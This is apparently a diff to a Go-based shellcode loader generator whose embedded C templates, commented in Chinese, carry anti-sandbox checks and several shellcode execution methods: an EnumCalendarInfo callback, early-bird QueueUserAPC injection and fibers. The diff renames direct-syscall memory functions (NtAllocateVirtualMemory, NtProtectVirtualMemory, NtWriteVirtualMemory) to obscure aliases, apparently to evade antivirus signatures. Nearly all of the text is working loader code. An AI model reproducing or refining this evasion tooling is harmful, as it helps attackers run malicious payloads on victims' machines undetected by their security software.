@@ -1,5 +1,9 @@
 package Loader
 
+//VAVPVM	NtProtectVirtualMemory
+//VAVWVM	NtWriteVirtualMemory
+//VAVAVM	NtAllocateVirtualMemory
+
 // 反沙箱代码
 // 声明反沙箱函数 判断质数
 var __c__sandbox1 = `
@@ -26,10 +30,10 @@ var __c__sandbox2 = `
 // 回调函数加载
 var __c__callback = `
     DWORD oldProtect;
-    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
-    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
-    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
-	Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
+    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+	VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
 var __c__earlyBird = `
@@ -43,8 +47,8 @@ var __c__earlyBird = `
 
     QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
     testAlert();
-    //Sw3NtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    //Sw3NtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
+    //VAVAVM(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    //VAVWVM(hProcess, addr, xpp, length, &bytesWritten);
     ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ////RtlMoveMemory(addr1, xpp,length);
     ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
@@ -55,8 +59,8 @@ var __c__earlyBird = `
 // 纤程加载
 var __c__fiber = `
     PVOID mainFiber = ConvertThreadToFiber(NULL);
-    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
-    Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
+    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
 
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);
 
